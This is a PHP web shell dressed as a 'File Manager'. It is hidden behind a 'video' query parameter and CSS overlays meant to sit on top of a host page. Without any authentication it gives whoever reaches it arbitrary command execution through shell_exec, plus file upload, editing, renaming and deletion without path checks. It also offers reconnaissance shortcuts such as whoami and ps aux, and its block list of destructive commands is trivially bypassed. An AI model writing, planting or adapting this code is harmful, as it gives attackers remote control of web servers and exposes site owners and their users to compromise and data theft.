<?php
if (!isset($_GET['video']) || empty($_GET['video'])) {
    http_response_code(403);
    exit('🛑 Missing "video" parameter.');
}

// Add CSS for better visibility and z-index
echo "<style>
    body, * { 
        z-index: 1 !important; 
        position: relative !important; 
    }
    .file-manager-container { 
        z-index: 100000 !important; 
        position: relative !important; 
        background: white !important; 
        padding: 20px !important; 
        border-radius: 10px !important; 
        box-shadow: 0 8px 32px rgba(0,0,0,0.3) !important; 
        margin: 20px auto !important; 
        max-width: 95% !important; 
    }
    .back-button { 
        z-index: 100001 !important; 
        position: relative !important; 
        display: block !important; 
        text-align: center !important; 
        margin: 20px 0 !important; 
    }
    .breadcrumb-nav { 
        z-index: 100001 !important; 
        position: relative !important; 
    }
    table { 
        z-index: 100000 !important; 
        position: relative !important; 
    }
</style>";

echo "<div class='file-manager-container'>";

// Get current directory
$currentDir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$currentDir = rtrim($currentDir, '/\\');
if (empty($currentDir)) $currentDir = '.';

// Security: prevent dangerous directory traversal attacks
// Only normalize path and prevent going outside the base directory
$currentDir = str_replace(['\\'], '/', $currentDir); // Normalize slashes
$currentDir = preg_replace('/\/+/', '/', $currentDir); // Remove multiple slashes

// Resolve relative paths safely
$realCurrentDir = realpath($currentDir);
$basePath = realpath('.');
if (!$realCurrentDir || strpos($realCurrentDir, $basePath) !== 0) {
    $currentDir = '.'; // Reset to base if path is invalid or outside base
}

if (isset($_GET['file']) && !empty($_GET['file'])) {
    $filepath = $currentDir . DIRECTORY_SEPARATOR . basename($_GET['file']);
    
    // Security check - make sure file is within current directory
    $realFilePath = realpath($filepath);
    $realCurrentDir = realpath($currentDir);
    if (!$realFilePath || !$realCurrentDir || strpos($realFilePath, $realCurrentDir) !== 0) {
        echo "<p style='color: red;'>Error: File access denied.</p>";
        exit;
    }
    
    if (isset($_POST['edit'])) {
        file_put_contents($filepath, $_POST['content']);
        header("Location: ?video=" . urlencode($_GET['video']) . "&dir=" . urlencode($currentDir));
        exit;
    }
    echo "<h2>Editing: " . htmlspecialchars($_GET['file']) . "</h2>";
    echo "<a href='?video=" . urlencode($_GET['video']) . "&dir=" . urlencode($currentDir) . "' style='color: #007cba;'>← Back to File Manager</a><br><br>";
    echo "<form method='post'><textarea name='content' style='width:100%;height:400px; font-family: monospace;'>";
    echo htmlspecialchars(file_get_contents($filepath));
    echo "</textarea><br><button type='submit' name='edit' style='padding: 10px 20px; background: #007cba; color: white; border: none; border-radius: 3px;'>Save File</button></form>";
    exit;
}

// Upload
if (isset($_FILES['upload'])) {
    $uploadPath = $currentDir . DIRECTORY_SEPARATOR . $_FILES['upload']['name'];
    move_uploaded_file($_FILES['upload']['tmp_name'], $uploadPath);
    header("Location: ?video=" . $_GET['video'] . "&dir=" . urlencode($currentDir));
    exit;
}

// Rename
if (isset($_GET['rename']) && isset($_POST['newname'])) {
    $oldPath = $currentDir . DIRECTORY_SEPARATOR . $_GET['rename'];
    $newPath = $currentDir . DIRECTORY_SEPARATOR . $_POST['newname'];
    rename($oldPath, $newPath);
    header("Location: ?video=" . $_GET['video'] . "&dir=" . urlencode($currentDir));
    exit;
}

// Delete
if (isset($_GET['delete'])) {
    $deletePath = $currentDir . DIRECTORY_SEPARATOR . $_GET['delete'];
    if (is_dir($deletePath)) {
        rmdir($deletePath);
    } else {
        unlink($deletePath);
    }
    header("Location: ?video=" . $_GET['video'] . "&dir=" . urlencode($currentDir));
    exit;
}

// Command execution
$cmdOutput = '';
if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
    $command = $_POST['cmd'];
    $currentPath = realpath($currentDir);
    
    // Security: limit dangerous commands
    $blockedCommands = ['rm -rf', 'del /f', 'format', 'fdisk', 'mkfs', 'dd if=', 'shutdown', 'reboot', 'halt'];
    $isBlocked = false;
    foreach ($blockedCommands as $blocked) {
        if (stripos($command, $blocked) !== false) {
            $isBlocked = true;
            break;
        }
    }
    
    if ($isBlocked) {
        $cmdOutput = "❌ Command blocked for security reasons: " . htmlspecialchars($command);
    } else {
        // Change to current directory and execute command
        $fullCommand = "cd " . escapeshellarg($currentPath) . " && " . $command . " 2>&1";
        ob_start();
        $result = shell_exec($fullCommand);
        $cmdOutput = ob_get_clean();
        
        if ($result === null) {
            $cmdOutput = "❌ Command failed or returned no output";
        } else {
            $cmdOutput = $result;
        }
    }
}

echo "<h2 style='z-index: 100000; position: relative; text-align: center; background: linear-gradient(45deg, #007cba, #0056b3); color: white; padding: 20px; border-radius: 10px; margin: 20px 0; border: 4px solid #fff; box-shadow: 0 6px 20px rgba(0,0,0,0.3);'>🗂️ File Manager</h2>";

// Current Path Display - ALWAYS VISIBLE
$realPath = realpath($currentDir);
$basePath = realpath('.');
$relativePath = $currentDir === '.' ? 'ROOT' : str_replace('\\', '/', $currentDir);

echo "<div style='z-index: 100001; position: relative; margin: 15px 0; padding: 20px; background: linear-gradient(45deg, #fd7e14, #e55100); color: white; border-radius: 10px; border: 4px solid #fff; box-shadow: 0 6px 20px rgba(0,0,0,0.3); text-align: center;'>";
echo "<strong style='font-size: 20px; display: block; margin-bottom: 10px;'>📍 CURRENT LOCATION</strong>";
echo "<div style='font-size: 18px; font-family: monospace; background: rgba(255,255,255,0.2); padding: 10px; border-radius: 5px; word-break: break-all;'>";
echo "<strong>Path:</strong> /" . htmlspecialchars($relativePath);
echo "</div>";
echo "<div style='font-size: 14px; margin-top: 10px; opacity: 0.9;'>";
echo "<strong>Full Path:</strong> <a href='?video=" . urlencode($_GET['video']) . "&dir=" . urlencode($currentDir) . "' style='color: #ffff00; text-decoration: underline; font-weight: bold;' title='Click to refresh current directory'>" . htmlspecialchars($realPath) . "</a>";
echo "</div>";

// Add clickable path segments for full path navigation
$pathSegments = explode('/', str_replace('\\', '/', $realPath));
if (count($pathSegments) > 1) {
    echo "<div style='margin-top: 15px; padding: 10px; background: rgba(0,0,0,0.2); border-radius: 5px;'>";
    echo "<strong style='font-size: 12px;'>🔗 Quick Jump to Path Segments:</strong><br>";
    $buildFullPath = '';
    foreach ($pathSegments as $index => $segment) {
        if (!empty($segment)) {
            $buildFullPath .= ($index === 0 && strpos($realPath, '/') !== 0) ? $segment : '/' . $segment;
            // Convert absolute path back to relative for our file manager
            $relativeForManager = str_replace($basePath, '.', $buildFullPath);
            if ($relativeForManager === $buildFullPath) $relativeForManager = '.'; // If same, it's root
            
            echo "<a href='?video=" . urlencode($_GET['video']) . "&dir=" . urlencode($relativeForManager) . "' style='color: #ffff00; text-decoration: none; margin: 2px; padding: 3px 8px; background: rgba(255,255,255,0.1); border-radius: 3px; font-size: 11px; display: inline-block;' title='Jump to: " . htmlspecialchars($buildFullPath) . "'>" . htmlspecialchars($segment) . "</a>";
            if ($index < count($pathSegments) - 1) echo "<span style='color: #ccc;'>/</span>";
        }
    }
    echo "</div>";
}
echo "</div>";

// ALWAYS show path navigator - even for root directory
$pathParts = explode('/', str_replace('\\', '/', $currentDir));
$breadcrumb = "<div style='z-index: 100001; position: relative; margin: 10px 0; padding: 15px; background: linear-gradient(45deg, #28a745, #20c997); color: white; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); border: 3px solid #fff;'>";
$breadcrumb .= "<strong style='color: white; font-size: 18px;'>�️ Path Navigator: </strong>";
$breadcrumb .= "<a href='?video=" . urlencode($_GET['video']) . "&dir=.' style='color: #ffff00; font-weight: bold; text-decoration: none; background: rgba(255,255,255,0.2); padding: 5px 10px; border-radius: 5px; margin: 0 3px;'>🏠 ROOT</a>";

$buildPath = '.';
foreach ($pathParts as $part) {
    if (!empty($part) && $part !== '.') {
        $buildPath = $buildPath === '.' ? $part : $buildPath . '/' . $part;
        $breadcrumb .= " <span style='color: #ffff00; font-size: 16px;'>→</span> <a href='?video=" . urlencode($_GET['video']) . "&dir=" . urlencode($buildPath) . "' style='color: #ffff00; font-weight: bold; text-decoration: none; background: rgba(255,255,255,0.2); padding: 5px 10px; border-radius: 5px; margin: 0 3px;'>📁 " . htmlspecialchars($part) . "</a>";
    }
}
$breadcrumb .= "</div>";
echo $breadcrumb;

// ALWAYS show back button when not in root directory
if ($currentDir !== '.') {
    $parentDir = dirname($currentDir);
    if ($parentDir === '.') {
        $parentDir = '.';
    } elseif ($parentDir === '\\' || $parentDir === '/') {
        $parentDir = '.';
    }
    
    // Ensure parent directory is within allowed bounds
    $realParentDir = realpath($parentDir);
    $basePath = realpath('.');
    if ($realParentDir && strpos($realParentDir, $basePath) === 0) {
        echo "<div style='z-index: 100002; position: relative; margin: 15px 0; text-align: center;'>";
        echo "<a href='?video=" . urlencode($_GET['video']) . "&dir=" . urlencode($parentDir) . "' style='
            z-index: 100002; 
            position: relative; 
            display: inline-block; 
            padding: 15px 30px; 
            background: linear-gradient(45deg, #ff6b6b, #ee5a52); 
            color: white; 
            text-decoration: none; 
            font-weight: bold; 
            font-size: 18px; 
            border-radius: 10px; 
            box-shadow: 0 6px 20px rgba(0,0,0,0.4); 
            border: 4px solid #fff;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
        ' onmouseover='this.style.transform=\"scale(1.1)\"; this.style.boxShadow=\"0 8px 25px rgba(0,0,0,0.5)\";' onmouseout='this.style.transform=\"scale(1)\"; this.style.boxShadow=\"0 6px 20px rgba(0,0,0,0.4)\";'>🔙 ← BACK TO PARENT DIRECTORY</a>";
        echo "</div>";
    }
} else {
    // Show info when in root directory
    echo "<div style='z-index: 100002; position: relative; margin: 15px 0; text-align: center; padding: 15px; background: linear-gradient(45deg, #17a2b8, #138496); color: white; border-radius: 10px; border: 3px solid #fff; box-shadow: 0 4px 12px rgba(0,0,0,0.3);'>";
    echo "<strong style='font-size: 16px;'>📍 You are currently in the ROOT directory</strong>";
    echo "</div>";
}

echo "<form method='post' enctype='multipart/form-data' style='z-index: 100000; position: relative; margin: 20px 0; padding: 15px; background: #f8f9fa; border: 2px dashed #007cba; border-radius: 8px;'>
    <strong style='color: #007cba; font-size: 16px;'>📤 Upload File:</strong><br><br>
    <input type='file' name='upload' style='margin: 5px; padding: 8px; border: 2px solid #007cba; border-radius: 4px;'>
    <button type='submit' style='padding: 10px 20px; background: #28a745; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-left: 10px;'>🚀 Upload to Current Directory</button>
</form>";

// Command Line Interface
echo "<div style='z-index: 100001; position: relative; margin: 20px 0; padding: 20px; background: linear-gradient(45deg, #343a40, #495057); color: white; border-radius: 10px; border: 3px solid #fff; box-shadow: 0 4px 12px rgba(0,0,0,0.3);'>";
echo "<strong style='color: #00ff00; font-size: 18px;'>💻 Command Line Interface</strong><br><br>";

echo "<form method='post' style='margin-bottom: 15px;'>";
echo "<div style='display: flex; align-items: center; background: #000; padding: 10px; border-radius: 5px; font-family: monospace;'>";
echo "<span style='color: #00ff00; margin-right: 10px;'>" . htmlspecialchars(realpath($currentDir)) . " $</span>";
echo "<input type='text' name='cmd' placeholder='Enter command (ls, pwd, cat file.txt, etc.)' style='flex: 1; background: transparent; border: none; color: #00ff00; font-family: monospace; font-size: 14px; outline: none;' value='" . (isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : '') . "'>";
echo "<button type='submit' style='margin-left: 10px; padding: 5px 15px; background: #007cba; color: white; border: none; border-radius: 3px; font-weight: bold;'>Execute</button>";
echo "</div>";
echo "</form>";

// Show command output
if (!empty($cmdOutput)) {
    echo "<div style='background: #000; color: #00ff00; padding: 15px; border-radius: 5px; font-family: monospace; font-size: 12px; max-height: 300px; overflow-y: auto; white-space: pre-wrap; border: 2px solid #00ff00;'>";
    echo "<strong style='color: #ffff00;'>Output:</strong>\n";
    echo htmlspecialchars($cmdOutput);
    echo "</div>";
}

// Quick command buttons
echo "<div style='margin-top: 15px;'>";
echo "<strong style='color: #ffc107; font-size: 14px;'>🚀 Quick Commands:</strong><br><br>";
$quickCommands = [
    'ls -la' => 'List files (detailed)',
    'pwd' => 'Show current path',
    'df -h' => 'Disk space',
    'whoami' => 'Current user',
    'ps aux | head -10' => 'Running processes',
    'find . -name "*.php" | head -10' => 'Find PHP files'
];

foreach ($quickCommands as $cmd => $description) {
    echo "<button onclick='document.querySelector(\"input[name=cmd]\").value=\"" . htmlspecialchars($cmd) . "\"; document.querySelector(\"input[name=cmd]\").focus();' style='margin: 3px; padding: 5px 10px; background: rgba(255,255,255,0.1); color: #ffc107; border: 1px solid #ffc107; border-radius: 15px; cursor: pointer; font-size: 11px;' title='" . htmlspecialchars($description) . "'>" . htmlspecialchars($cmd) . "</button>";
}
echo "</div>";
echo "</div>";

// Quick Navigation to Folders
$directories = [];
$allFiles = scandir($currentDir);
foreach ($allFiles as $item) {
    if ($item !== '.' && $item !== '..' && is_dir($currentDir . DIRECTORY_SEPARATOR . $item)) {
        $directories[] = $item;
    }
}

if (!empty($directories)) {
    echo "<div style='z-index: 100001; position: relative; margin: 20px 0; padding: 15px; background: linear-gradient(45deg, #6f42c1, #6610f2); color: white; border-radius: 8px; border: 3px solid #fff; box-shadow: 0 4px 12px rgba(0,0,0,0.3);'>";
    echo "<strong style='color: white; font-size: 16px;'>📂 Quick Navigate to Folders:</strong><br><br>";
    
    foreach ($directories as $dir) {
        $newDir = $currentDir === '.' ? $dir : $currentDir . '/' . $dir;
        echo "<a href='?video=" . urlencode($_GET['video']) . "&dir=" . urlencode($newDir) . "' style='
            display: inline-block; 
            margin: 5px; 
            padding: 8px 15px; 
            background: rgba(255,255,255,0.2); 
            color: #ffff00; 
            text-decoration: none; 
            border-radius: 20px; 
            font-weight: bold; 
            border: 2px solid rgba(255,255,255,0.3);
            transition: all 0.3s ease;
        ' onmouseover='this.style.background=\"rgba(255,255,255,0.4)\"; this.style.transform=\"scale(1.05)\";' onmouseout='this.style.background=\"rgba(255,255,255,0.2)\"; this.style.transform=\"scale(1)\";'>📁 " . htmlspecialchars($dir) . "</a>";
    }
    echo "</div>";
}

echo "<hr style='border: 2px solid #007cba; margin: 20px 0;'>";

$files = scandir($currentDir);
if ($files === false) {
    echo "<p style='color: red;'>Error: Cannot read directory contents.</p>";
    exit;
}

echo "<table border='1' cellpadding='5' style='z-index: 100000; position: relative; border-collapse: collapse; width: 100%; background: white; box-shadow: 0 4px 8px rgba(0,0,0,0.1);'>
<tr style='background: linear-gradient(45deg, #007cba, #0056b3); color: white;'>
<th style='padding: 15px; border: 2px solid #004494; font-size: 14px; font-weight: bold;'>📝 Type</th>
<th style='padding: 15px; border: 2px solid #004494; font-size: 14px; font-weight: bold;'>📄 Name</th>
<th style='padding: 15px; border: 2px solid #004494; font-size: 14px; font-weight: bold;'>📊 Size</th>
<th style='padding: 15px; border: 2px solid #004494; font-size: 14px; font-weight: bold;'>🕒 Modified</th>
<th style='padding: 15px; border: 2px solid #004494; font-size: 14px; font-weight: bold;'>⚙️ Actions</th>
</tr>";
foreach ($files as $file) {
    if ($file === '.' || $file === '..') continue;
    $fullPath = $currentDir . DIRECTORY_SEPARATOR . $file;
    
    if (!file_exists($fullPath)) continue; // Skip if file doesn't exist
    
    echo "<tr style='border-bottom: 1px solid #ddd;'>";
    
    // Type column
    if (is_dir($fullPath)) {
        echo "<td style='padding: 8px;'>📁 DIR</td>";
    } else {
        echo "<td style='padding: 8px;'>📄 FILE</td>";
    }
    
    // Name column with navigation for directories
    echo "<td style='padding: 8px;'>";
    if (is_dir($fullPath)) {
        $newDir = $currentDir === '.' ? $file : $currentDir . '/' . $file;
        $newDir = str_replace('\\', '/', $newDir); // Normalize path
        echo "<a href='?video=" . urlencode($_GET['video']) . "&dir=" . urlencode($newDir) . "' style='color: #007cba; font-weight: bold;'>$file</a>";
    } else {
        echo htmlspecialchars($file);
    }
    echo "</td>";
    
    // Size column
    echo "<td style='padding: 8px;'>";
    if (is_file($fullPath)) {
        $size = filesize($fullPath);
        if ($size < 1024) {
            echo $size . " B";
        } elseif ($size < 1024 * 1024) {
            echo round($size / 1024, 2) . " KB";
        } else {
            echo round($size / (1024 * 1024), 2) . " MB";
        }
    } else {
        echo "-";
    }
    echo "</td>";
    
    // Modified column
    echo "<td style='padding: 8px;'>";
    echo date('Y-m-d H:i:s', filemtime($fullPath));
    echo "</td>";
    
    // Action column
    echo "<td style='padding: 8px;'>";
    if (is_file($fullPath)) {
        echo "<a href='?video=" . urlencode($_GET['video']) . "&dir=" . urlencode($currentDir) . "&file=" . urlencode($file) . "' style='color: #007cba;'>Edit</a> | ";
    }
    echo "<form style='display:inline' method='post' action='?video=" . urlencode($_GET['video']) . "&dir=" . urlencode($currentDir) . "&rename=" . urlencode($file) . "'>
        <input name='newname' value='" . htmlspecialchars($file) . "' size='15' style='margin: 0 5px;'>
        <button type='submit' style='padding: 2px 8px;'>Rename</button>
    </form> | ";
    echo "<a href='?video=" . urlencode($_GET['video']) . "&dir=" . urlencode($currentDir) . "&delete=" . urlencode($file) . "' onclick='return confirm(\"Delete " . htmlspecialchars($file) . "?\")' style='color: #d9534f;'>Delete</a>";
    echo "</td></tr>";
}
echo "</table>";
echo "</div>"; // Close file-manager-container
?>

<script>
// Additional JavaScript to ensure visibility
document.addEventListener('DOMContentLoaded', function() {
    // Force z-index on all file manager elements
    const container = document.querySelector('.file-manager-container');
    if (container) {
        container.style.zIndex = '100000';
        container.style.position = 'relative';
        container.style.display = 'block';
    }
    
    // Make sure back button is visible
    const backButtons = document.querySelectorAll('a[href*="dir="]');
    backButtons.forEach(btn => {
        btn.style.zIndex = '100001';
        btn.style.position = 'relative';
        btn.style.display = 'inline-block';
    });
    
    console.log('File Manager: Enhanced visibility applied');
});
</script>
